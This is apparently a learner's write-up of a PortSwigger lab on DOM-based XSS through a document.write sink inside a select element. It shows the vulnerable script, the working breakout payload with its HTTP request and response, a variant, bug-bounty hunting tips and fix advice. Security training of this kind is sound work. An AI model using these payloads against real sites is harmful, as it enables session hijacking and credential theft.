# LAB: DOM XSS in document.write sink using source location.search inside a select element

|                             |                                                                                                                                 |
| --------------------------- | ------------------------------------------------------------------------------------------------------------------------------ |
| **Topic**                   | Cross-site scripting (XSS)                                                                                                    |
| **Difficulty**              | Apprentice                                                                                                                     |
| **Date**                    | 2026-11-21                                                                                                                     |
| **Time**                    |                 10                                                                                                              |
| **Solved without solution** | yes                                                                                                                             |
| **Link**                    | [lab-document-write-sink-inside-select-element](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element) |

## 1. Objective

Perform a DOM-based Cross-Site Scripting (XSS) attack on a stock check feature where user input from `location.search` flows into a `document.write()` sink inside a `<select>` element, executing `alert(window.origin)`.

## 2. Surface

- URL query parameter (`/product?productId=1&storeId=...`).
- Client-side JavaScript embedded in the product page handling the `storeId` parameter.
- DOM Sink: `document.write(...)` call responsible for dynamically generating `<option>` elements inside a `<select>` dropdown menu.

## 3. Hypothesis

If client-side JavaScript reads the `storeId` parameter from `location.search` without encoding or sanitizing it, and directly passes it into `document.write()` to build an `<option>` tag, injecting syntax-breaking tags (such as `</select><script>`) will close the parent `<select>` context and allow arbitrary JavaScript execution via an injected `<script>` element.

## 4. Payload that worked

Request:
```http
GET /product?productId=4&storeId=%27%3C/option%3E%3Cscript%3Ealert(%27%27)%3C/script%3E HTTP/2
Host: <host>.web-security-academy.net
Cookie: session=sess
Sec-Ch-Ua: "Not:A-Brand";v="8", "Chromium";v="156"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```
Response:
```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 5469
<select name="storeId">
  <option selected="">'</option>
  <script>alert('')</script>
  <option>London</option>
  <option>Paris</option>
  <option>Milan</option>
</select>
```
## 5. Why it works

Analyzing the client-side script embedded in the product page revealed how the `storeId` parameter was read from `window.location.search` and processed:

```javascript
var stores = ["London","Paris","Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
if(store) {
    document.write('<option selected>'+store+'</option>');
}
for(var i=0;i<stores.length;i++) {
    if(stores[i] === store) {
        continue;
    }
    document.write('<option>'+stores[i]+'</option>');
}
document.write('</select>');
```

The application extracts the `storeId` value directly from the URL query string using `URLSearchParams` and concatenates it directly into a `document.write()` call without HTML sanitization: `document.write('<option selected>'+store+'</option>')`. 

Injecting `&storeId='</option><script>alert('')</script>` forces an explicit breakout from the dynamically generated `<option>` element. The string `</option>` closes the option tag early, allowing the subsequent `<script>alert('')</script>` payload to be injected cleanly into the DOM tree as an executable script block rather than plain text within the dropdown menu.

## 6. What I tried that failed

- Testing initial values like `&storeId=1` and `&storeId=Paris` confirmed that user input directly controlled the content within the `<option selected>` tag, skipping duplicate array entries.
- Testing the structural breakout boundary with `&storeId='</option>Paris` rendered `Paris` outside the `<option>` tag on a new line, confirming that raw HTML tag injection was unescaped inside the DOM sink.
- Rule extracted: When input is reflected inside non-standard or restricted tags (such as `<select>`, `<textarea>`, or `<title>`), always inspect the client-side source code to determine the exact parent element that must be closed (`</option>`, `</select>`) before injecting new executable tags (`<script>`).

## 7. In a real target (bounty translation)

- Where it shows up: Dynamic form controls, custom dropdown selectors, language/currency pickers, or product options generated via client-side JavaScript from URL parameters.
- Quick detection: Trace how URL parameters are processed in client-side scripts. Inspect the browser DOM to see if parameters are rendered inside restrictive parent tags (like `<select>`, `<textarea>`, or `<title>`) via dangerous sinks like `document.write()`.
- Impact: Execution of arbitrary JavaScript in the victim's session context via tailored URLs, enabling session takeover, DOM tampering, or credential theft.
- In the report: Document the client-side JavaScript code snippet, identify the source (`location.search`) and sink (`document.write`), outline the exact HTML element breakout mechanism, and provide the working PoC link.

## 8. Bypass / variants noticed

- Closing both the `<option>` and the parent `<select>` tags explicitly (e.g., `&storeId=</option></select><script>alert('')</script>`) to completely escape the form container context.
- Leveraging inline event handlers or breaking out of attribute contexts if the input is reflected within dynamic element attributes constructed inside `document.write()`.
  
## 9. Takeaway

When dynamically constructing structured HTML elements like `<select>` using client-side JavaScript, applications must avoid writing raw URL parameters into HTML sinks. Inputs should be sanitized/encoded for the specific HTML context, or safer DOM manipulation methods (such as `document.createElement()` and `textContent`) should be used.
